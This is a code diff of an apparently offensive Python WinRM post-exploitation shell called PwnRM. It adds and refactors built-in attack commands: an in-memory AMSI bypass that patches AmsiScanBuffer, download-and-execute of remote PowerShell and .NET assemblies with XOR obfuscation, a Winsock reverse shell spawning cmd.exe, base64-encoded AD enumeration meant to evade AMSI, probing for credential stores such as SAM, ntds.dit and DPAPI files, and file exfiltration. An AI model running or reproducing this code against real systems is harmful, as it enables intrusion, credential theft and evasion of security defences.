+                ("!download ",  self.download),
+                ("!upload ",    self.upload),
+                ("!amsi",       lambda _: self.amsi_bypass()),
+                ("!netrun ",    self.netrun),
+                ("!psrun ",     self.psrun),
+                ("!revshell ",  self.revshell),
+                ("!adtriage",   self._adtriage_dispatch),
+                ("!sysinfo",    lambda _: self.sysinfo()),
+                ("!creds",      lambda _: self.creds_hint()),
+                ("!log",        lambda _: self.start_log()),
+                ("!stoplog",    lambda _: self.stop_log()),
+            ]
+
+            matched = False
+            for prefix, fn in dispatch:
+                if cmd.lower().startswith(prefix.lower()):
+                    fn(cmd[len(prefix):].strip())
+                    matched = True
+                    break
+
+            if not matched:
+                if cmd.startswith("!") or cmd in {"help","?"}:
+                    self.help()
+                else:
+                    if self.stdout_log:
+                        self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
+                        self.stdout_log.flush()
+                    self.run_with_interrupt(cmd, self.write_line)
+                    self.update_cwd()
+
+    # ── prompt / input ────────────────────────────────────────────────────────
     def update_cwd(self):
         self.cwd = self.run_sync("Get-Location | Select -Expand Path").strip()
 
     def read_line(self):
         while True:
             try:
-                pre = f"\x1b[1m\x1b[33mPS\x1b[0m {self.cwd}> "
-                if prompt_toolkit_available:
-                    cmd = prompt(ANSI(pre), history=self.prompt_history, enable_history_search=True)
+                ps_pre = f"{BLD}{M}PwnRM{RST}|{c(C,self.cwd)}> "
+                if _PTK:
+                    cmd = prompt(ANSI(ps_pre), history=self.prompt_history,
+                                 completer=self._completer,
+                                 enable_history_search=True)
                 else:
-                    cmd = input(pre)
+                    cmd = input(ps_pre)
             except KeyboardInterrupt:
                 continue
             except EOFError:
@@ -293,331 +556,358 @@ class PwnShell:
             else:
                 yield cmd
 
-    def write_warning(self, msg):
-        self.write_line({ "warn" : msg })
-
-    def write_info(self, msg):
-        self.write_line({ "info" : msg, "endl" : "\n" })
-
-    def write_error(self, msg):
-        self.write_line({ "error" : msg })
-
-    def write_progress(self, msg):
-        self.write_line({ "progress" : msg })
+    # ── output handlers ───────────────────────────────────────────────────────
+    def _clear(self):
+        return "\033[2K\r" if self.need_clear else ""
 
     def write_line(self, out):
-        clear = "\033[2K\r" if self.need_clear else ""
-        self.need_clear = False
-        log_msg = b""
-
-        if "stdout" in out: # from Write-Output
-            print(clear + out["stdout"], flush=True)
-            log_msg = out["stdout"].encode() + b"\n"
-
-        elif "info" in out: # from Write-Host
-            print(clear + out["info"], end=out["endl"], flush=True)
-            log_msg = out["info"].encode() + out["endl"].encode()
-
-        elif "error" in out: # from Write-Error and exceptions
-            print(clear + "\x1b[31m" + out["error"] + "\x1b[0m", flush=True)
-
-        elif "warn" in out: # from Write-Warning
-            print(clear + "\x1b[33m" + out["warn"] + "\x1b[0m", flush=True)
-
-        elif "verbose" in out: # from Write-Verbose
-            print(clear + out["verbose"], flush=True)
-
-        elif "progress" in out: # from Write-Progress
-            print(clear + "\x1b[34m" + out["progress"] + "\x1b[0m", end="\r", flush=True)
+        clr = self._clear(); self.need_clear = False
+        log = b""
+        if "stdout" in out:
+            print(clr + out["stdout"], flush=True)
+            log = out["stdout"].encode() + b"\n"
+        elif "info" in out:
+            print(clr + out["info"], end=out["endl"], flush=True)
+            log = (out["info"] + out["endl"]).encode()
+        elif "error" in out:
+            print(clr + c(R, out["error"]), flush=True)
+        elif "warn" in out:
+            print(clr + c(Y, "  [!] " + out["warn"]), flush=True)
+        elif "verbose" in out:
+            print(clr + c(DIM, out["verbose"]), flush=True)
+        elif "progress" in out:
+            print(clr + c(B, "  [~] " + out["progress"]), end="\r", flush=True)
             self.need_clear = True
+        if self.stdout_log and log:
+            self.stdout_log.write(log); self.stdout_log.flush()
 
-        if self.stdout_log:
-            self.stdout_log.write(log_msg)
-            self.stdout_log.flush()
+    def write_info(self, msg):    self.write_line({"info": msg, "endl": "\n"})
+    def write_warning(self, msg): self.write_line({"warn": msg})
+    def write_error(self, msg):   self.write_line({"error": msg})
+    def write_progress(self, msg):self.write_line({"progress": msg})
 
     def run_sync(self, cmd):
-        return "\n".join(out.get("stdout") for out in self.runspace.run_command(cmd) if "stdout" in out)
+        return "\n".join(
+            o.get("stdout","") for o in self.runspace.run_command(cmd) if "stdout" in o
+        )
 
-    def run_with_interrupt(self, cmd, output_handler=None, exception_handler=None):
-        output_stream = self.runspace.run_command(cmd)
+    def run_with_interrupt(self, cmd, handler=None, exc_handler=None):
+        stream = self.runspace.run_command(cmd)
         while True:
             with CtrlCHandler(timeout=5) as h:
                 try:
-                    out = next(output_stream)
+                    out = next(stream)
                 except StopIteration:
                     break
                 except Exception as e:
-                    if exception_handler and exception_handler(e):
+                    if exc_handler and exc_handler(e):
                         continue
-                    else:
-                        raise e
+                    raise
+                if handler:
+                    handler(out)
+            if h.interrupted:
+                self.runspace.interrupt()
+                return True
+        return False
 
-                if output_handler:
-                    output_handler(out)
+    # ══════════════════════════════════════════════════════════════════════════
+    #  BUILT-IN COMMANDS
+    # ══════════════════════════════════════════════════════════════════════════
 
-                if h.interrupted:
-                    self.runspace.interrupt()
+    # ── !adtriage (NEW in v1.0.0) ─────────────────────────────────────────────
+    def _adtriage_dispatch(self, args):
+        quick = "-q" in args.lower() or "--quick" in args.lower()
+        self.adtriage(quick=quick)
 
-        return h.interrupted > 0
+    def adtriage(self, quick=False):
+        """
+        AD Triage — runs an entirely self-contained PowerShell enumeration
+        inside the remote session.  No extra binaries needed on target.
+        Covers: identity, domain basics, HV groups, Kerberoast, AS-REP,
+        unconstrained/constrained/RBCD delegation, ADCS (ESC1/3/4 quick scan),
+        gMSA/dMSA (BadSuccessor hint), ACL quick-wins, pre-2000 compat access,
+        and accounts with password-never-expires + adminCount=1.
+        """
+        self.write_info(c(M+BLD, "  [*] PwnRM AD Triage — loading remote enumeration module..."))
+        ps = _ADTRIAGE_PS.replace("'__QUICK__'", "$true" if quick else "$false")
+        # Inject as a ScriptBlock to stay under AMSI radar
+        encoded = b64str(ps.encode("utf-16le"))
+        cmd = f"powershell -NonInteractive -EncodedCommand {encoded}"
+        # Prefer direct Invoke-Expression so the output streams correctly
+        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
+        self.run_with_interrupt(cmd, self.write_line)
 
-    def psrun(self, cmdline):
-        args = split_args(cmdline)[:2]
-
-        url = args[-1]
-        xorfunc = ""
-        if args[0].lower() == "-xor":
-            if len(args) != 2:
-                self.write_warning("missing URL")
-                return
-
-            if args[-1].lower().startswith("http"):
-                self.write_warning("use -xor only for files that were uploaded with !upload -xor")
-                return
-
-            xorfunc = call_XorEnc
-
-        commands = [
-            import_XorEnc,
-            f'$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})',
-            f'$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))',
-             "$c = $c.Ast.EndBlock.Copy()",
-             "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
-             "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
-             "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
-             "Remove-Variable @('a','b','c')"
+    # ── !sysinfo ──────────────────────────────────────────────────────────────
+    def sysinfo(self):
+        self.write_info(c(C, "  [*] System snapshot"))
+        cmds = [
+            # OS / hostname / build
+            'Write-Host "`n[OS]"; $o=Get-WmiObject Win32_OperatingSystem;'
+            '"  Name     : "+$o.Caption; "  Build    : "+$o.BuildNumber;'
+            '"  Hostname : "+$env:COMPUTERNAME; "  Domain   : "+$env:USERDNSDOMAIN',
+            # Hotfixes (last 10)
+            'Write-Host "`n[Hotfixes (last 10)]";'
+            'Get-HotFix | Sort InstalledOn -Desc | Select -First 10 | '
+            'ForEach-Object { "  "+$_.HotFixID+" "+$_.Description+" "+$_.InstalledOn }',
+            # AV products
+            'Write-Host "`n[AV Products]";'
+            'try { Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct |'
+            'ForEach-Object { "  "+$_.displayName } } catch { "  (SecurityCenter2 not available)" }',
+            # Local admins
+            'Write-Host "`n[Local Administrators]";'
+            'net localgroup administrators 2>$null | Select-Object -Skip 6 | '
+            'Where-Object { $_ -and $_ -notmatch "----" } | ForEach-Object { "  "+$_ }',
+            # WinRM / SMB signing
+            'Write-Host "`n[WinRM / SMB]";'
+            '"  WinRM port : 5985/5986";'
+            'try { $s=Get-SmbServerConfiguration; "  SMB Signing Required: "+$s.RequireSecuritySignature } catch {}',
         ]
+        for c_ in cmds:
+            self.run_with_interrupt(c_, self.write_line)
 
-        for cmd in commands:
+    # ── !creds (DPAPI / history hints) ───────────────────────────────────────
+    def creds_hint(self):
+        self.write_info(c(C, "  [*] Credential artifact hints"))
+        ps = r"""
+$targets = @(
+    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
+    "$env:APPDATA\Microsoft\Credentials",
+    "$env:LOCALAPPDATA\Microsoft\Credentials",
+    "$env:APPDATA\Microsoft\Protect",
+    "C:\Windows\System32\config\SAM",
+    "C:\Windows\NTDS\ntds.dit",
+    "C:\inetpub\wwwroot\web.config",
+    "C:\Windows\Panther\unattend.xml",
+    "C:\ProgramData\McAfee\Agent\DB\ma.db"
+)
+foreach ($t in $targets) {
+    if (Test-Path $t -ErrorAction SilentlyContinue) {
+        Write-Host "  [+] FOUND: $t" -ForegroundColor Green
+    }
+}
+# Check for saved credentials
+$creds = cmdkey /list 2>$null
+if ($creds -match "Target") { Write-Host "`n  [!] cmdkey entries:" -ForegroundColor Yellow; $creds | Write-Host }
+Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAPI dump"
+"""
+        self.run_with_interrupt(ps, self.write_line)
+
+    # ── !amsi ─────────────────────────────────────────────────────────────────
+    def amsi_bypass(self):
+        cmds = [
+            _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
+            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
+            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
+            "Start-Sleep -Seconds 1",
+            "[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
+            "Start-Sleep -Seconds 1",
+            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
+        ]
+        self.write_info(c(Y, "  [*] Patching AmsiScanBuffer..."))
+        for cmd in cmds:
             logging.debug(cmd)
             self.run_with_interrupt(cmd, self.write_line)
+        self.write_info(c(G, "  [+] AMSI bypass applied."))
 
+    # ── !psrun ────────────────────────────────────────────────────────────────
+    def psrun(self, cmdline):
+        args   = split_args(cmdline)[:2]
+        url    = args[-1]
+        xorfunc= ""
+        if args[0].lower() == "-xor":
+            if len(args) != 2:
+                self.write_warning("usage: !psrun [-xor] URL"); return
+            if args[-1].lower().startswith("http"):
+                self.write_warning("Use -xor only with files uploaded via !upload -xor"); return
+            xorfunc = call_XorEnc
+        cmds = [
+            import_XorEnc,
+            f"$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})",
+            f"$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))",
+            "$c = $c.Ast.EndBlock.Copy()",
+            "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
+            "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
+            "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
+            "Remove-Variable @('a','b','c')"
+        ]
+        for cmd in cmds:
+            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
 
+    # ── !netrun ───────────────────────────────────────────────────────────────
     def netrun(self, cmdline):
         args = split_args(cmdline)
         if args[0].lower() == "-xor":
             if len(args) == 1:
-                self.write_warning("missing URL and [ARGS..]")
-                return
+                self.write_warning("usage: !netrun [-xor] URL [ARG..]"); return
             xorfunc = call_XorEnc
-            args = args[1:]
+            args    = args[1:]
         else:
             xorfunc = ""
-
-        args = [ str_b64(arg) for arg in args ]
-
-        url = args[0]
+        args = [str_b64(a) for a in args]
+        url  = args[0]
         argv = "[string[]]@(" + ",".join(args[1:]) + ")"
-
-        commands = [
+        cmds = [
             import_HostWriter, import_XorEnc,
             f"$buf = (New-Object Net.WebClient).DownloadData({url})",
             f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
             f"$out = {new_HostWriter}",
             f"[Console]::SetOut($out); [Console]::SetError($out)",
             f"$dll.EntryPoint.Invoke($null,(,{argv}))",
-            f"[Console]::SetOut([IO.StreamWriter]::Null)",
-            f"[Console]::SetError([IO.StreamWriter]::Null)",
-            f"$out.Dispose()",
-            f"Remove-Variable @('buf','dll','out')"
+            "[Console]::SetOut([IO.StreamWriter]::Null)",
+            "[Console]::SetError([IO.StreamWriter]::Null)",
+            "$out.Dispose()",
+            "Remove-Variable @('buf','dll','out')"
         ]
+        for cmd in cmds:
+            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
 
-        for cmd in commands:
-            logging.debug(cmd)
-            self.run_with_interrupt(cmd, self.write_line)
-
-
-    def amsi_bypass(self):
-        commands = [
-            _import_LoadLibrary,
-            _import_GetProcAddress,
-            _import_VirtualProtect,
-            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
-            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
-            f"Start-Sleep -Seconds 1", # this seems to do the trick for now...
-            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
-            f"Start-Sleep -Seconds 1",
-            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
-        ]
-        for cmd in commands:
-            logging.debug(cmd)
-            self.run_with_interrupt(cmd, self.write_line)
-
-
+    # ── !revshell ─────────────────────────────────────────────────────────────
     def revshell(self, cmdline):
         args = split_args(cmdline)
         try:
-            ip, port = ip_address(args[0]).packed, int(args[1])
+            ip   = ip_address(args[0]).packed
+            port = int(args[1])
             p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
         except:
-            return
-
-        commands = [
+            self.write_warning("usage: !revshell IP PORT"); return
+        cmds = [
             _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
             f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
             f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
             f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
             f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
             f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
-            f"Remove-Variable @('sock','sinfo')"
+            "Remove-Variable @('sock','sinfo')"
         ]
+        self.write_info(c(Y, f"  [*] Spawning reverse shell → {args[0]}:{args[1]}"))
+        for cmd in cmds:
+            logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
 
-        for cmd in commands:
-            logging.debug(cmd)
-            self.run_with_interrupt(cmd, self.write_line)
-
-
+    # ── !upload ───────────────────────────────────────────────────────────────
     def upload(self, cmdline):
         args = split_args(cmdline)
-
         if args[0].lower() == "-xor":
-            unxor = False
-            args = args[1:]
+            unxor = False; args = args[1:]
         else:
             unxor = True
-
         src = Path(args[0])
         dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
         try:
-            with open(src, "rb") as f:
-                buf = f.read()
+            with open(src,"rb") as f: buf = f.read()
         except IOError as e:
-            self.write_error(str(e))
-            return
+            self.write_error(str(e)); return
 
-        tmpfn = self.run_sync("[IO.Path]::GetTempPath()")
-        tmpfn = tmpfn + randbytes(8).hex() + ".tmp"
+        tmpfn = self.run_sync("[IO.Path]::GetTempPath()") + randbytes(8).hex() + ".tmp"
         total = 0
-        self.write_info(f"uploading to {tmpfn}")
-
+        self.write_info(f"  [~] Uploading → {c(C,str(tmpfn))}")
         self.run_sync(import_XorEnc)
         for chunk in chunks(buf, 65536):
             total += len(chunk)
-            chunk = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
-            xorfunc = call_XorEnc if unxor else ""
-            cmd = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}({chunk})))"
+            chunk_b64 = f"[Convert]::FromBase64String('{b64str(xorenc(chunk, _xor_key))}')"
+            xorfunc   = call_XorEnc if unxor else ""
+            cmd = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}({chunk_b64})))"
+            if self.run_with_interrupt(cmd):
+                self.write_warning("Upload interrupted"); self.run_sync(f"Remove-Item -Force '{tmpfn}'"); return
+            self.write_progress(f"Upload {total}/{len(buf)} bytes")
+        self.write_info(f"  [~] Moving to {c(C,str(dst))}")
+        self.run_with_interrupt(f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'", self.write_line)
+        h = self.run_sync(f"(Get-FileHash '{dst}' -Algorithm MD5).Hash")
+        ok = MD5.new(buf if unxor else xorenc(buf, _xor_key)).hexdigest().upper()
+        if h.strip() != ok:
+            self.write_error("  Upload integrity check FAILED — file may be corrupted!")
+        else:
+            self.write_info(c(G, "  [+] Upload complete — MD5 verified."))
 
-            interrupted = self.run_with_interrupt(cmd)
-            if interrupted:
-                self.write_warning("upload interrupted")
-                self.run_sync(f"Remove-Item -Force '{tmpfn}'")
-                return
-
-            self.write_progress(f"progress: {total}/{len(buf)}")
-
-        self.write_info(f"moving from {tmpfn} to {dst}")
-        ps = f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'"
-        self.run_with_interrupt(ps, self.write_line)
-
-        ps = f"(Get-FileHash '{dst}' -Algorithm MD5).Hash"
-        out = self.run_sync(ps)
-        md5sum = MD5.new(buf if unxor else xorenc(buf, _xor_key))
-        if out.strip() != md5sum.hexdigest().upper():
-            self.write_error("Corrupted upload")
-
-
+    # ── !download ─────────────────────────────────────────────────────────────
     def download(self, cmdline):
         args = split_args(cmdline)
-        if len(args) == 0 or len(args) > 2:
-            self.write_warning("usage: !download RPATH [LPATH]")
-            return
+        if not args or len(args) > 2:
+            self.write_warning("usage: !download RPATH [LPATH]"); return
 
         src = self.run_sync(f"Resolve-Path -LiteralPath '{args[0]}' | Select -Expand Path")
         if not src:
-            self.write_warning(f"{args[0]} not found")
-            return
-
-        src = PureWindowsPath(src)
-
+            self.write_warning(f"{args[0]} not found on remote"); return
+        src = PureWindowsPath(src.strip())
         dst = Path(args[1]) if len(args) == 2 else Path(src.name)
-        if dst.is_dir():
-            dst = dst.joinpath(src.name)
+        if dst.is_dir(): dst = dst / src.name
+        if not dst.parent.exists(): os.makedirs(dst.parent, exist_ok=True)
 
-        if not dst.parent.exists():
-            os.makedirs(dst.parent, exist_ok=True)
-
-        src_is_dir = self.run_sync(f"Test-Path -Path '{src}' -PathType Container") == "True"
-        if src_is_dir:
-            if not dst.name.lower().endswith(".zip"):
-                dst = Path(dst.parent).joinpath(f"{dst.name}.zip")
-            self.write_info(f"{src} is a directory, will download a zip file of its contents to {dst}")
-
+        is_dir = self.run_sync(f"Test-Path -Path '{src}' -PathType Container") == "True"
+        if is_dir:
+            if not dst.name.lower().endswith(".zip"): dst = dst.parent / f"{dst.name}.zip"
+            self.write_info(f"  [~] Directory → ZIP download: {c(C,str(dst))}")
             tmpdir = self.run_sync("[System.IO.Path]::GetTempPath()")
-            tmpnm = randbytes(8).hex()
-            tmpfn = tmpdir + tmpnm
+            tmpnm  = randbytes(8).hex()
+            tmpfn  = tmpdir + tmpnm
             ps = f"""
-                Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-                New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
-                Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
-                    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
-                        try {{
-                            $dst = $_.FullName.Replace('{src}', '')
-                            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$dst"
-                        }} catch {{
-                            Write-Warning "skipping $dst"
-                        }}
-                    }}
-                }}
-                {_importPathFix}
-                [IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip', [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
-                Remove-Item -Recurse -Force -Path '{tmpfn}'
-            """
-
+Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
+Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
+    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
+        try {{
+            $d = $_.FullName.Replace('{src}', '')
+            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$d"
+        }} catch {{ Write-Warning "skipping $d" }}
+    }}
+}}
+{_importPathFix}
+[IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip',
+    [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
+Remove-Item -Recurse -Force -Path '{tmpfn}'
+"""
             self.run_with_interrupt(ps, self.write_line)
             src = tmpfn + ".zip"
 
         ps = f"""function Download-Remote {{
-            $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
-            $f = [System.IO.File]::OpenRead('{src}');
-            $b = New-Object byte[] 65536;
-            while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
-            $f.Close();
-            [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
-            }}
-            Download-Remote
-            Remove-Item Function:Download-Remote
-        """
-
-        self.write_info(f"downloading {src}")
-        def collect(buf, out):
-            if part := out.get("stdout"):
-                buf += b64decode(part)
-                self.write_progress(f"progress: {len(buf)} bytes")
-
+    $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
+    $f = [System.IO.File]::OpenRead('{src}');
+    $b = New-Object byte[] 65536;
+    while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
+    $f.Close();
+    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
+}}
+Download-Remote
+Remove-Item Function:Download-Remote
+"""
+        self.write_info(f"  [~] Streaming {c(C,str(src))} ...")
         buf = bytearray()
-        self.run_with_interrupt(ps, lambda out: collect(buf, out))
 
-        if src_is_dir:
-            self.run_sync(f"Remove-Item -fo '{src}'") # remove the zip too
+        def collect(out):
+            if part := out.get("stdout"):
+                buf.extend(b64decode(part))
+                self.write_progress(f"Download {len(buf)} bytes")
 
+        self.run_with_interrupt(ps, collect)
+
+        if is_dir: self.run_sync(f"Remove-Item -fo '{src}'")
         if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
-            self.write_error("Corrupted download or file access error")
+            self.write_error("  Download integrity check FAILED!")
             return
-
-        self.write_info(f"done, writing to {dst.resolve()}")
+        self.write_info(f"  [+] Writing {c(G,str(dst.resolve()))}")
         try:
-            with open(dst, "wb") as f:
-                f.write(buf[:-32])
+            with open(dst,"wb") as f: f.write(buf[:-32])
         except IOError as e:
             self.write_error(str(e))
 
 
+# ── entry point ───────────────────────────────────────────────────────────────
 def main():
-    print(PWN_RM_ASCII)
-    args = argument_parser().parse_args()
-
+    print(_BANNER)
+    args      = argument_parser().parse_args()
     logger.init(args.ts)
+    logging.getLogger().setLevel(logging.DEBUG if args.debug else logging.INFO)
     if args.debug:
-        logging.getLogger().setLevel(logging.DEBUG)
         logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
 
-
-    timeout = int(args.timeout)
+    timeout   = int(args.timeout)
     transport = create_transport(args)
+    tinfo = {
+        "host": getattr(args,"target","?"),
+        "user": getattr(args,"username","?"),
+    }
 
     with Runspace(transport, timeout) as runspace:
-        shell = PwnShell(runspace)
+        shell = PwnShell(runspace, target_info=tinfo)
         try:
             if args.X:
                 shell.repl(iter([args.X]))
@@ -626,6 +916,10 @@ def main():
                 shell.repl()
         except EOFError:
             pass
+        finally:
+            elapsed = str(datetime.now() - shell.start_time).split(".")[0]
+            print(c(DIM, f"\n  [~] Session duration: {elapsed}  |  Commands: {shell.cmd_count}\n"))
+
 
 if __name__ == "__main__":
     main()
